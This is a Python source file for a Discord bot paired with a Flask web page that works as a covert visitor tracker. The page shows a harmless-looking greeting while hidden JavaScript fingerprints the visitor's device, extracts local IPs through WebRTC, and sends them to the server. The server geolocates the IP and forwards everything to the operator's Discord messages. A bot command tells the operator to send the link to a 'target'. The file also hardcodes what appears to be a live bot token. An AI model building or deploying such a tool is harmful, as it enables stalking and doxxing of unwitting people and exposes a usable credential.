import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, jsonify
import requests
import socket
import threading
from datetime import datetime
import os

# ═══════════════════════════════════════════
# ⚙️ CONFIG - Edit these
# ═══════════════════════════════════════════
BOT_TOKEN = "MTU2NDA2NTI2MjM0MzQyNjE3OA.GWwkdO.Pq5qGimqAZcFogN0HSSM63O8kcpjs0FUwtf984"
YOUR_USER_ID = 1503781167059697679  # ضع ID حسابك هنا
# هذا السطر يقرأ المنفذ تلقائياً من الاستضافة (Wispbyte) أو يستخدم 5000 محلياً
PORT = int(os.environ.get("PORT", 5000)) 

# ═══════════════════════════════════════════
# Flask App
# ═══════════════════════════════════════════
app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexo Chikrok HBi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            color: white; text-align: center; padding: 20px; overflow: hidden;
        }
        .container { animation: fadeIn 1s ease-in-out; }
        h1 {
            font-size: 56px; font-weight: 800;
            background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
            background-size: 300% 300%;
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            background-clip: text; animation: gradient 4s ease infinite;
            margin-bottom: 30px; letter-spacing: 2px;
        }
        .msg {
            font-size: 30px; font-weight: 600; color: #feca57;
            margin-bottom: 25px; text-shadow: 0 0 20px rgba(254, 202, 87, 0.5);
            animation: pulse 1.5s ease-in-out infinite;
        }
        .bye {
            font-size: 42px; font-weight: 800; color: #ff6b6b;
            text-shadow: 0 0 25px rgba(255, 107, 107, 0.7);
            animation: bounce 1s ease-in-out infinite; letter-spacing: 4px;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes gradient { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Nexo Chikrok HBi</h1>
        <div class="msg">Bizo mn zizo Ymak</div>
        <div class="bye">By By</div>
    </div>

    <script>
        async function collectEverything() {
            const data = {};

            data.screen = screen.width + "x" + screen.height;
            data.availScreen = screen.availWidth + "x" + screen.availHeight;
            data.colorDepth = screen.colorDepth + "bit";
            data.pixelRatio = window.devicePixelRatio || "N/A";
            data.orientation = screen.orientation ? screen.orientation.type : "N/A";

            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.languages = (navigator.languages || []).join(", ");
            data.cookiesEnabled = navigator.cookieEnabled;
            data.doNotTrack = navigator.doNotTrack || "N/A";
            data.online = navigator.onLine;

            data.cores = navigator.hardwareConcurrency || "N/A";
            data.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
            data.maxTouchPoints = navigator.maxTouchPoints || 0;

            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
            data.localTime = new Date().toLocaleString();
            data.utcOffset = -new Date().getTimezoneOffset() / 60 + " hours";

            if (navigator.connection) {
                data.connectionType = navigator.connection.effectiveType || "N/A";
                data.downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "N/A";
                data.rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "N/A";
            }

            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not charging)");
                }
            } catch(e) {}

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    data.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                    data.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            data.referrer = document.referrer || "Direct";
            data.pageUrl = window.location.href;

            try {
                const rtcData = await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    const ips = new Set();
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) { pc.close(); resolve([...ips]); return; }
                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
                        if (m) ips.add(m[1]);
                    };
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    setTimeout(() => { pc.close(); resolve([...ips]); }, 2000);
                });
                if (rtcData.length) data.localIPs = rtcData.join(", ");
            } catch(e) {}

            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) { console.error(e); }
        }

        collectEverything();
    </script>
</body>
</html>
"""

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_ip_info(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            if d.get('status') == 'success':
                return d
    except Exception as e:
        print(f"[IP INFO ERROR] {e}")
    return {}

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"

# ═══════════════════════════════════════════
# Discord Bot
# ═══════════════════════════════════════════
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

async def send_visitor_dm(ip, ip_info, extra=None):
    """Send visitor data to your DM"""
    try:
        user = await bot.fetch_user(YOUR_USER_ID)
    except Exception as e:
        print(f"[ERROR] Cannot fetch user {YOUR_USER_ID}: {e}")
        return

    hostname = get_hostname(ip)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    embed = discord.Embed(
        title="🎯 New Visitor Captured",
        description=f"**Time:** `{now}`",
        color=0x00ff00,
        timestamp=datetime.utcnow()
    )

    # ─── Network / IP ───
    embed.add_field(name="🌐 IP Address", value=f"```{ip}```", inline=False)
    embed.add_field(name="🖥️ Hostname", value=f"`{hostname}`", inline=False)

    # ─── Location ───
    embed.add_field(name="🏙️ City", value=f"`{ip_info.get('city', 'N/A')}`", inline=True)
    embed.add_field(name="🌍 Country", value=f"`{ip_info.get('country', 'N/A')}`", inline=True)
    embed.add_field(name="📍 Region", value=f"`{ip_info.get('regionName', 'N/A')}`", inline=True)
    embed.add_field(name="📮 ZIP", value=f"`{ip_info.get('zip', 'N/A')}`", inline=True)
    embed.add_field(name="🕐 Timezone", value=f"`{ip_info.get('timezone', 'N/A')}`", inline=True)

    # ─── ISP ───
    embed.add_field(name="🏢 ISP", value=f"`{ip_info.get('isp', 'N/A')}`", inline=False)
    embed.add_field(name="📡 Organization", value=f"`{ip_info.get('org', 'N/A')}`", inline=True)
    embed.add_field(name="🔢 ASN", value=f"`{ip_info.get('as', 'N/A')}`", inline=True)

    # ─── Security Flags ───
    flags = []
    if ip_info.get('mobile'): flags.append("📱 Mobile")
    if ip_info.get('proxy'): flags.append("🕵️ Proxy/VPN")
    if ip_info.get('hosting'): flags.append("☁️ Hosting/DC")
    if flags:
        embed.add_field(name="⚠️ Flags", value=" ".join(flags), inline=False)

    # ─── Map ───
    lat, lon = ip_info.get('lat'), ip_info.get('lon')
    if lat and lon:
        embed.add_field(
            name="📌 Location",
            value=f"[{lat}, {lon}](https://www.google.com/maps?q={lat},{lon})",
            inline=False
        )

    # ─── Browser & Device Data ───
    if extra:
        browser_info = (
            f"Screen: {extra.get('screen','N/A')}\n"
            f"Available: {extra.get('availScreen','N/A')}\n"
            f"Color Depth: {extra.get('colorDepth','N/A')}\n"
            f"Pixel Ratio: {extra.get('pixelRatio','N/A')}\n"
            f"Orientation: {extra.get('orientation','N/A')}\n"
            f"Platform: {extra.get('platform','N/A')}\n"
            f"Language: {extra.get('language','N/A')}\n"
            f"Languages: {extra.get('languages','N/A')}"
        )
        embed.add_field(name="💻 Display", value=f"```{browser_info}```", inline=False)

        hardware_info = (
            f"CPU Cores: {extra.get('cores','N/A')}\n"
            f"RAM: {extra.get('memory','N/A')}\n"
            f"Touch Points: {extra.get('maxTouchPoints','N/A')}\n"
            f"GPU Vendor: {extra.get('gpuVendor','N/A')}\n"
            f"GPU Renderer: {extra.get('gpuRenderer','N/A')}\n"
            f"Battery: {extra.get('battery','N/A')}"
        )
        embed.add_field(name="⚙️ Hardware", value=f"```{hardware_info}```", inline=False)

        network_info = (
            f"Connection: {extra.get('connectionType','N/A')}\n"
            f"Downlink: {extra.get('downlink','N/A')}\n"
            f"RTT: {extra.get('rtt','N/A')}\n"
            f"Local IPs: {extra.get('localIPs','N/A')}\n"
            f"Online: {extra.get('online','N/A')}"
        )
        embed.add_field(name="📶 Network", value=f"```{network_info}```", inline=False)

        time_info = (
            f"Timezone: {extra.get('timezone','N/A')}\n"
            f"Locale: {extra.get('locale','N/A')}\n"
            f"Local Time: {extra.get('localTime','N/A')}\n"
            f"UTC Offset: {extra.get('utcOffset','N/A')}"
        )
        embed.add_field(name="🕒 Time & Locale", value=f"```{time_info}```", inline=False)

        privacy_info = (
            f"Cookies: {extra.get('cookiesEnabled','N/A')}\n"
            f"Do Not Track: {extra.get('doNotTrack','N/A')}\n"
            f"Referrer: {extra.get('referrer','N/A')}"
        )
        embed.add_field(name="🔒 Privacy", value=f"```{privacy_info}```", inline=False)

        embed.add_field(
            name="🖱️ User Agent",
            value=f"```{extra.get('userAgent','N/A')[:1000]}```",
            inline=False
        )

    embed.set_footer(text="IP Tracker • NeXo")

    try:
        await user.send(embed=embed)
        print(f"[✓] DM sent for IP {ip}")
    except discord.Forbidden:
        print("[ERROR] Cannot DM you. Make sure DMs from server members are enabled")
    except Exception as e:
        print(f"[DM ERROR] {e}")

def send_dm_from_thread(ip, ip_info, extra=None):
    bot.loop.create_task(send_visitor_dm(ip, ip_info, extra))

# ═══════════════════════════════════════════
# Flask Routes
# ═══════════════════════════════════════════
@app.route('/')
def index():
    ip = get_client_ip()
    ip_info = get_ip_info(ip)
    send_dm_from_thread(ip, ip_info)
    return render_template_string(HTML_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        ip = get_client_ip()
        ip_info = get_ip_info(ip)
        send_dm_from_thread(ip, ip_info, data)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# مسار إضافي لبعض الاستضافات (مثل Wispbyte) لكي لا توقف السيرفر
@app.route('/health')
def health():
    return "OK", 200

# ═══════════════════════════════════════════
# Bot Events & Commands
# ═══════════════════════════════════════════
@bot.event
async def on_ready():
    print(f"✅ Bot ready: {bot.user}")
    print(f"📡 Flask server running on port {PORT}")
    try:
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send("✅ **Bot is online!**\nEvery visitor will be auto-tracked and sent here.")
        print("[✓] Startup DM sent")
    except Exception as e:
        print(f"[WARNING] Could not send startup DM: {e}")

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"🏓 Pong! `{round(bot.latency*1000)}ms`")

@bot.command(name="link")
async def get_link(ctx):
    await ctx.send(
        f"🔗 **Send this link to the target:**\n"
        f"```http://YOUR_PUBLIC_IP:{PORT}/```\n"
        f"💡 Use ngrok to make it public:\n```ngrok http {PORT}```"
    )

@bot.command(name="lookup")
async def lookup(ctx, ip: str):
    info = get_ip_info(ip)
    if not info:
        await ctx.send(f"❌ No information found for `{ip}`")
        return
    hostname = get_hostname(ip)
    embed = discord.Embed(title=f"🔍 IP Lookup: {ip}", color=0xffaa00)
    embed.add_field(name="City", value=info.get('city','N/A'), inline=True)
    embed.add_field(name="Country", value=info.get('country','N/A'), inline=True)
    embed.add_field(name="Region", value=info.get('regionName','N/A'), inline=True)
    embed.add_field(name="ISP", value=info.get('isp','N/A'), inline=False)
    embed.add_field(name="Hostname", value=f"`{hostname}`", inline=False)
    if info.get('lat'):
        embed.add_field(
            name="Location",
            value=f"[Map](https://www.google.com/maps?q={info['lat']},{info['lon']})",
            inline=False
        )
    await ctx.send(embed=embed)

# ═══════════════════════════════════════════
# Run Flask in a separate thread
# ═══════════════════════════════════════════
def run_flask():
    # تشغيل السيرفر على جميع الواجهات
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print(f"🌐 Flask running on port {PORT}")
    bot.run(BOT_TOKEN)